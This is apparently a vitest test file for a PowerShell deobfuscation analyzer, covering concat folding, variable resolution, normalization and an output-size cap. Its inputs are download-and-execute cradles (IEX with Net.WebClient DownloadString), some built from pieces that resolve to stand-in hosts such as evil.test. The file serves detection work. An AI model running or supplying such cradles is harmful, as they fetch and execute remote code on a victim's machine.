// shared/analyzer/__tests__/resolve.test.ts
import { describe, expect, it } from 'vitest'
import { foldConcat, resolveVars, resolve, normalize } from '../resolve'

describe('foldConcat', () => {
  it('collapses a chain of string-literal concatenations', () => {
    expect(foldConcat("'IE'+'X'")).toBe("'IEX'")
    expect(foldConcat("'Down'+'load'+'String'")).toBe("'DownloadString'")
  })
  it('preserves non-foldable tokens around a concat', () => {
    expect(foldConcat("IEX ('Ne'+'w')")).toBe("IEX ( 'New' )")
  })
  it('leaves a lone string untouched (no + operator)', () => {
    expect(foldConcat("'http://a/x'")).toBe("'http://a/x'")
  })
  it('does not fold across a non-string operand (refuses)', () => {
    // $x is not a literal → the + chain is not foldable; leave tokens as-is
    expect(foldConcat("'a'+$x")).toBe("'a' + $x")
  })
  it('escapes embedded single quotes when re-quoting a folded value', () => {
    // 'can''t' lexes to value `can't`; folded with 'stop' → `can'tstop`; re-quoted with '' escaping
    expect(foldConcat("'can''t'+'stop'")).toBe("'can''tstop'")
  })
})

describe('resolveVars', () => {
  it('substitutes a variable bound once to a string literal', () => {
    // $u = 'http://a/x' ; IEX $u   →   … IEX 'http://a/x'
    expect(resolveVars("$u = 'http://a/x' ; IEX $u")).toContain("IEX 'http://a/x'")
  })
  it('refuses a variable assigned twice (leaves it unsubstituted)', () => {
    const out = resolveVars("$u = 'a' ; $u = 'b' ; IEX $u")
    expect(out).toContain('IEX $u') // ambiguous → not substituted
  })
  it('leaves a variable with no literal binding alone', () => {
    expect(resolveVars('IEX $undefined')).toContain('IEX $undefined')
  })
  it('does not substitute a variable used before its assignment', () => {
    // the use precedes the only assignment → value not known yet → leave $u
    expect(resolveVars("IEX $u ; $u = 'http://evil.example'")).toContain('IEX $u')
  })
  it('escapes single quotes in a substituted variable value', () => {
    // $p lexes to value `a'b`; substituted use re-quotes with '' escaping
    expect(resolveVars("$p = 'a''b' ; IEX $p")).toContain("IEX 'a''b'")
  })
})

describe('resolve (fixpoint)', () => {
  it('resolves variable-built concatenation across statements', () => {
    const out = resolve("$a = 'http://ev' ; $b = 'il.test/x' ; $u = $a + $b ; IEX $u")
    expect(out).toContain("IEX 'http://evil.test/x'")
  })
  it('is idempotent on already-clean input', () => {
    const clean = "IEX ( New-Object Net.WebClient ) . DownloadString ( 'http://a/x' )"
    expect(resolve(clean)).toBe(resolve(resolve(clean)))
  })
})

describe('normalize', () => {
  it('matches resolve on input with no concat/vars (mere reformatting only)', () => {
    // no + concat, no $var bindings — resolve should differ from the raw input
    // only in whitespace, exactly as normalize does (the re-emit baseline).
    const input = "IEX (New-Object Net.WebClient).DownloadString('http://a/x')"
    expect(resolve(input)).toBe(normalize(input))
  })
  it('re-spaces but does not fold concatenations', () => {
    expect(normalize("'a'+'b'")).toContain('+')
    expect(normalize("'a'+'b'")).not.toBe(foldConcat("'a'+'b'"))
  })
})

describe('resolve output cap', () => {
  it('caps output size on an amplifying concat cradle', () => {
    const base = 'A'.repeat(2048)
    let src = `$v0 = '${base}'`
    for (let k = 1; k <= 12; k++) src += ` ; $v${k} = $v${k - 1} + $v${k - 1}`
    expect(resolve(src).length).toBeLessThanOrEqual(1 << 20)
  })
})
